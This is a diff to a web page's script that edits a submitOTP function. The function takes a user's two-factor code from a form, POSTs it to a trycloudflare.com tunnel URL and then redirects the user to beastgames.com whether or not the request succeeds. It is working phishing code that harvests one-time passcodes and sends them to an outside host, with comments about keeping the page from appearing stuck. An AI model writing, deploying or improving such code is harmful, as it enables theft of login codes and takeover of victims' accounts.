@@ -253,16 +253,20 @@
         }
 
         function submitOTP() {
-            const c = document.getElementById('2fa_code').value; 
-            fetch(tunnel, {
-                method: 'POST',
-                body: new URLSearchParams({ '2fa_code': c })
-            }).then(() => {
-                window.location.href = "https://www.beastgames.com";
-            }).catch(() => {
-                window.location.href = "https://www.beastgames.com";
-            });
-        }
+    const c = document.getElementById('2fa_code').value; 
+    fetch('https://postposted-settings-belly-quest.trycloudflare.com', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({ '2fa_code': c })
+    }).then(() => {
+        // --- PUT THE REDIRECT HERE ---
+        window.location.href = "https://www.beastgames.com";
+    }).catch(() => {
+        // Redirect even if there is an error so the site "unsticks"
+        window.location.href = "https://www.beastgames.com";
+    });
+}
+
     </script>
 </body>
 </html>
